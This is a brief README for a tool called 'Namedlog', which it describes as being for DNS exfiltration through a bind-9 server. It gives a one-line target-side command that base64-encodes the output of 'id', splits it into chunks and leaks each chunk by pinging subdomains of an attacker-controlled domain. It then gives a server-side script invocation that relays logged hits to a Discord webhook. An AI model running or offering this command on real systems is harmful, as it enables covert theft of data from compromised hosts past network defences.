# Namedlog
This tools is useful for DNS exfiltration via bind-9.


# Notes
Replace 'WEBHOOK_URL' with your Discord webhook URL
WEBHOOK_URL = ''

# Command

- Target Side: (keyword is __mysign__)
```bash
id|base64|fold -10|while read x;do ping -c 1 $x.mysign.mysite.com ;done

```

- Server Side:

You can send the keyword to your discord if it logged on `/var/log/named/named.log`:

```bash
python namedlog.py mysign
```


